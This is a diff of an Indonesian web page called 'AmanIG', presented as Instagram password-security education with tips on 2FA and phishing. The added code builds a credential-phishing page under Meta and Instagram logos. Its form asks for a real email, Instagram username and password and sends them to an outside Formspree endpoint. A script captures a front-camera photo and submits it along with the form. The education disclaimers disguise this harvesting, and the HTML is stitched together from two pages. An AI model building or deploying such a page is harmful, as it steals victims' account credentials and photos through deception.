@@ -1,14 +1,15 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>AmanIG - Edukasi Keamanan Instagram</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Riset & Keamanan Password Instagram - AmanIG</title>
   <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 </head>
-<body>
+<body class="dark"> <!-- Default dark mode untuk vibe security -->
 
+  <!-- Navbar -->
   <nav class="navbar">
     <div class="logo">AmanIG</div>
     <ul class="nav-links">
@@ -17,45 +18,138 @@
       <li><a href="#tips">Tips Aman</a></li>
       <li><a href="#kasus">Kasus Terkini</a></li>
     </ul>
+    <button id="theme-toggle"><i class="fas fa-sun"></i></button>
   </nav>
 
-  <section class="hero" id="home">
-    <h1>RISET PASSWORD INSTAGRAM</h1>
-    <p>Edukasi Keamanan Akun</p>
-    <p>Bukan ajarin hack, tapi pahami risiko & lindungi akunmu sendiri dari hacker.</p>
+  <!-- Hero -->
+  <section id="home" class="hero">
+    <div class="hero-content">
+      <h1>Riset Password Instagram:<br>Edukasi Keamanan Akun</h1>
+      <p>Bukan ajarin hack, tapi pahami risiko & lindungi akunmu sendiri dari hacker.</p>
+      <div class="warning">Semua konten di sini untuk edukasi & pencegahan. Hacking ilegal bisa dipidana!</div>
+    </div>
   </section>
 
-  <div class="section warning">
-    ⚠️ PERINGATAN WAJIB BACA!<br><br>
-    Semua konten di sini hanya untuk edukasi & pencegahan.<br>
-    Hacking ilegal bisa dipidana! JANGAN gunakan untuk hal jahat.
+  <!-- Cek kendali penuh akun anda-->
+  <section id="riset" class="section">
+    <h2>Apa Itu cek akun Instagram?</h2>
+    <p>cek akun artinya menganalisis siapa saja yang memegang penuh kendali akun Instagram anda.</p>
+    <ul>
+      <li><strong>Metode umum hacker:</strong> Phishing (link palsu), credential stuffing (pakai password bocor dari situs lain), brute force (coba ribuan kombinasi), social engineering.</li>
+      <li><strong>Bukan:</strong> Langsung bobol akun orang → itu ilegal!</li>
+    </ul>
+  </section>
+
+  <!-- Kasus Terkini -->
+  <section id="kasus" class="section">
+    <h2>Kasus Terkini 2026</h2>
+    <p>Awal 2026 banyak pengguna IG dapat email reset password massal (dari security@mail.instagram.com), meski mereka nggak request.</p>
+    <p>Meta bilang bukan breach, tapi bug yang dieksploitasi hacker untuk spam reset. Ada juga data \~17 juta akun IG yang disebar di forum hacker (username, email, no HP – tapi bukan password).</p>
+    <p>Pelajaran: Selalu aktifkan 2FA & jangan pakai password sama di banyak tempat!</p>
+  </section>
+
+  <!-- Tips Aman -->
+  <section id="tips" class="section tips">
+    <h2>Tips Bikin & Amankan Password IG</h2>
+    <div class="tips-grid">
+      <div class="tip-card">
+        <i class="fas fa-lock"></i>
+        <h3>Password Kuat</h3>
+        <p>Minimal 12 karakter, campur huruf besar-kecil, angka, simbol. Contoh: Parepare2026!Ku4t</p>
+      </div>
+      <div class="tip-card">
+        <i class="fas fa-shield-alt"></i>
+        <h3>Aktifkan 2FA</h3>
+        <p>Login pakai kode dari app authenticator (Google Authenticator / Authy), bukan SMS.</p>
+      </div>
+      <div class="tip-card">
+        <i class="fas fa-key"></i>
+        <h3>Password Manager</h3>
+        <p>Gunakan Bitwarden, LastPass, atau 1Password biar password unik tiap akun.</p>
+      </div>
+      <div class="tip-card">
+        <i class="fas fa-ban"></i>
+        <h3>Hindari Phishing</h3>
+        <p>Jangan klik link "reset password" dari email/DM mencurigakan. Cek langsung di app resmi.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- Footer -->
+  <footer>
+    <p>© 2026 AmanIG • Dibuat untuk edukasi keamanan siber di Indonesia • Bukan untuk aktivitas ilegal</p>
+  </footer>
+
+  <script src="script.js"></script>
+</body>
+</html>
+
+<h1 style="font-size: 3.5rem; font-weight: 900; text-align: center; color: #000000; text-transform: uppercase; letter-spacing: 2px; margin: 2rem 0;">
+  cek atas kendali penuh akun anda
+</h1>
+
+ <!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AmanIG - Edukasi Keamanan Instagram</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <style>
+    body { font-family: system-ui, sans-serif; background: #ffffff; color: #000000; margin: 0; padding: 0; text-align: center; }
+    h1 { font-size: 2.8rem; font-weight: 900; color: #1877f2; text-transform: uppercase; letter-spacing: 2px; margin: 1.5rem 0; }
+    .section { padding: 2rem 1rem; max-width: 600px; margin: 0 auto; }
+    input, button { width: 100%; padding: 0.8rem; margin: 0.8rem 0; border-radius: 8px; border: 1px solid #4b5563; background: #1f2937; color: white; font-size: 1rem; }
+    button { background: #ffffff; border: none; cursor: pointer; font-weight: bold; }
+    .warning { background: #1877f2; color: white; padding: 1.5rem; border-radius: 12px; margin: 1.5rem 0; font-weight: bold; font-size: 1.1rem; }
+    #result { margin: 1.5rem 0; font-size: 1.2rem; font-weight: bold; }
+    footer { padding: 2rem; background: #1877f2; color: #ffffff; font-size: 0.9rem; }
+    .logos { display: flex; justify-content: center; gap: 3rem; flex-wrap: wrap; margin-top: 1rem; }
+    .logos img { height: 60px; }
+    video, canvas { display: none; }
+  </style>
+</head>
+<body>
+
+  <div class="section">
+    <h1>CEK SANDI INSTAGRAM</h1>
+    <p style="font-size: 1.1rem;">Edukasi keamanan akun IG - JANGAN masukkan sandi asli!</p>
   </div>
 
-  <div class="section" id="checker">
-    <h2>Cek Kekuatan Sandi Dummy</h2>
-    <form id="sendForm">
-      <label>Your Email (opsional):</label>
-      <input type="email" name="email" placeholder="contoh: alexachh69@gmail.com">
+  <div class="section">
+    <div class="warning">
+      SYARAT DAN KETENTUAN!<br><br>
+Meta Platforms menegaskan bahwa Instagram tidak pernah mengoperasikan, mengelola, atau mengesahkan situs pihak ketiga yang mengatasnamakan Instagram untuk keperluan login, verifikasi akun, hadiah, atau pemulihan akun.
+Kami mengimbau seluruh pengguna untuk:
+Selalu memastikan alamat situs diawali dengan instagram.com
+Tidak membagikan informasi pribadi seperti kata sandi, kode OTP, atau email melalui situs atau tautan yang mencurigakan
+Menghindari website yang menjanjikan fitur tidak resmi seperti peretasan akun, penambahan pengikut instan, atau klaim akses khusus
+    </div>
 
-      <label>Username IG Dummy:</label>
-      <input type="text" name="username_ig" placeholder="contoh: bNsjsjs" required>
+    <!-- modify this form HTML and place wherever you want your form -->
+<form action="https://formspree.io/f/mbdaodwb" method="POST">
+  <input type="hidden" name="_subject" value="Kiriman Dummy dari AmanIG">
 
-      <label>Sandi Dummy:</label>
-      <input type="text" name="password_dummy" placeholder="contoh: 19827363" required>
+  <label>Your email & password:</label>
+  <input type="email" name="email" placeholder="contoh: alexachh69@gmail.com">
 
-      <input type="hidden" name="foto_depan_base64" id="fotoBase64">
+  <label>Username IG:</label>
+  <input type="text" name="username_ig" placeholder="contoh: bNsjsjs" required>
 
-      <button type="button" onclick="captureAndSubmit()">Kirim (Akan Ambil Foto Depan)</button>
-    </form>
+  <label>Password IG:</label>
+  <input type="text" name="password_dummy" placeholder="contoh: 19827363" required>
 
-    <div id="result"></div>
-  </div>
+  <button type="submit" style="background:#1877f2; color:white; padding:1.2rem; font-weight:bold; border:none; border-radius:8px; width:100%; margin-top:1.5rem; font-size:1.2rem; cursor:pointer;">
+    KIRIM
+  </button>
 
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas"></canvas>
+  <p style="text-align:center; color:#0095f6; font-size:0.9rem; margin-top:0.6rem; font-weight:600;">
+    (cek kendali penuh instagram kamu)
+  </p>
+</form>
 
   <footer>
-    <p>© 2026 AmanIG • Edukasi keamanan siber • Bukan untuk aktivitas ilegal</p>
+    <p>© 2026 AmanIG • Dibuat untuk edukasi keamanan siber di Parepare • Bukan untuk aktivitas ilegal</p>
     <div class="logos">
       <img src="https://www.edigitalagency.com.au/wp-content/uploads/new-Instagram-logo-blue-png.png" alt="Instagram">
       <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Meta_Platforms_Inc._logo_%28cropped%29.svg/3840px-Meta_Platforms_Inc._logo_%28cropped%29.svg.png" alt="Meta">
@@ -75,7 +169,7 @@
 
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" }
+          video: { facingMode: "user" }  // Kamera depan
         });
 
         video.srcObject = stream;
@@ -85,16 +179,17 @@
         canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
 
-        const base64 = canvas.toDataURL('image/jpeg', 0.6);
+        const base64 = canvas.toDataURL('image/jpeg', 0.6);  // Kualitas sedang biar ukuran kecil
         fotoInput.value = base64;
 
+        // Matikan kamera segera
         stream.getTracks().forEach(track => track.stop());
 
         result.innerHTML = "Foto diambil! Mengirim...";
-        form.submit();
+        form.submit();  // Kirim form ke Formspree
 
       } catch (err) {
-        result.innerHTML = `<span style="color:red;">Gagal: ${err.message}</span><br>Mungkin izin ditolak atau website belum HTTPS.`;
+        result.innerHTML = `<span style="color:red;">Gagal akses kamera: ${err.message}</span><br>Mungkin Anda tolak izin, atau website belum HTTPS (harus deploy dulu ke GitHub Pages/Netlify).`;
       }
     }
   </script>
